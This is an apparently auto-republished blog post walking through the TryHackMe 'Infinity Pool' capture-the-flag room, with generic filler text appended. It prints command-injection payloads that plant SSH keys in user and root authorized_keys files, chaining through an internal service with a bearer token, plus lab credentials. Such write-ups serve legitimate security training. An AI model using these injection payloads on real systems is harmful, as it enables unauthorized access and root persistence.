---
title: "Comprehensive Guide to Solving the Infinity Pool CTF Room on TryHackMe"
slug: "comprehensive-guide-to-solving-the-infinity-pool-ctf-room-on-tryhackme"
author: "Mohammad ali"
source: "devto_webdev"
published: "Thu, 06 Aug 2026 23:24:58 +0000"
description: "Introduction The Infinity Pool room on TryHackMe is an engaging and educational challenge combining network reconnaissance, web directory enumeration, comman..."
keywords: "ssh, key, root, web, command, flag, injection, phase"
generated: "2026-08-07T00:06:40.417294"
---

# Comprehensive Guide to Solving the Infinity Pool CTF Room on TryHackMe

## Overview

Introduction The Infinity Pool room on TryHackMe is an engaging and educational challenge combining network reconnaissance, web directory enumeration, command injection exploitation, internal dashboard access, and SSH key injection to achieve full root privileges. .............. Phase 1: Reconnaissance & Port Scanning We begin by scanning the target using nmap to discover open ports and active services on the target server. Command Used: .......................................................................... nmap -sV -sC ...................................................................... Explanation: Scans service versions, runs default scripts, and detects essential ports such as Port 22 (SSH) and Port 80 (HTTP Gunicorn). Illustration: .............................. Phase 2: Directory Enumeration with Gobuster After confirming the web server is operational, we perform directory and file fuzzing using gobuster to find hidden administrative pages or internal tools. Command Used: .......................................................................... gobuster dir -u http:// -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt .......................................................................... Explanation: Helps uncover hidden paths not visible to normal users. Illustration: ............................... Phase 3: Generating and Encoding an SSH Key Locally Before executing the injection, we generate an SSH key pair on our attack box (Kali) and encode the public key in Base64 format to ensure smooth passage through command injection strings without character breaking: Generate the Key Locally: .......................................................................... ssh-keygen -t rsa -b 2048 -f ./ctf_key -N "" .......................................................................... Encode the Public Key to Base64 (and copy the output): .......................................................................... base64 -w0 ctf_key.pub .......................................................................... .................................... Phase 4: Executing Command Injection & Injecting the User Key Using our encoded public key, we leverage the internal network check utility to inject the key and create the .ssh directory and authorization files for the web user: Command Used: .......................................................................... curl -sS -X POST http:///internal/netcheck \ --data-urlencode "host=127.0.0.1;mkdir -p /home/web/.ssh;echo 'YOUR_PUB_KEY_BASE64' | base64 -d > /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#" .......................................................................... ............................... Phase 5: Gaining Access and Reading the User Flag Once the injection succeeds and the key is planted, you can seamlessly log into the standard user account via SSH and read the user flag: SSH Connection Command: .......................................................................... ssh -o IdentitiesOnly=yes -i ctf_key web@ .......................................................................... .............................. Commands to read the flag after logging in: .......................................................................... cat user.txt .......................................................................... Illustration: User Flag: THM{......................} ....................... Phase 6: Extracting the Automation Key By browsing the internal dashboard or voicemail interface via 127.0.0.1:8080/ucp , we locate the data containing the secret automation key. This step is mandatory prior to exploitation so we can use the key later as a Bearer Token. Illustration: Extracted Key: cc_auto_7b3f9a1c4e0d2f6a http://127.0.0.1:8080 http://127.0.0.1:8080/ucp username : FreePBXUCPTemplateCreator password : St4yN0t1c3d_2026 ....................... Phase 7: Privilege Escalation & Reading the Root Flag Using the automation service alongside our previously discovered automation key ( cc_auto_7b3f9a1c4e0d2f6a ), we inject our SSH public key directly into the root directory to log in instantly and capture the final root flag: Advanced Root Injection Command: .......................................................................... curl -sS -X POST http:///internal/netcheck \ --data-urlencode "host=127.0.0.1;curl -sS -X POST http://127.0.0.1:9000/jobs/export -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' -H 'Content-Type: application/json' --data-binary '{\"report\":\"x;mkdir -p /root/.ssh;echo '\''YOUR_PUB_KEY_BASE64'\'' | base64 -d >> /root/.ssh/authorized_keys;chmod 700 /root/.ssh;chmod 600 /root/.ssh/authorized_keys;#\"}'" .......................................................................... .............................. Connect as Root and Read the Flag: .......................................................................... ssh -o IdentitiesOnly=yes -i ctf_key root@ .......................................................................... ...................... ls cat /root.txt ..................................... Illustration: Root Flag: THM{.....................}

## Key Insights

This article was discovered from the latest RSS feeds and automatically transformed into a readable blog post.

### What You Should Know

- Trending topic in the developer community
- Relevant technology discussion
- Worth exploring for deeper research

## Original Source

https://dev.to/mohammadali_30/comprehensive-guide-to-solving-the-infinity-pool-ctf-room-on-tryhackme-3c7f

## Conclusion

Technology moves quickly. Following curated RSS feeds helps developers stay informed about emerging tools, frameworks, and industry trends.
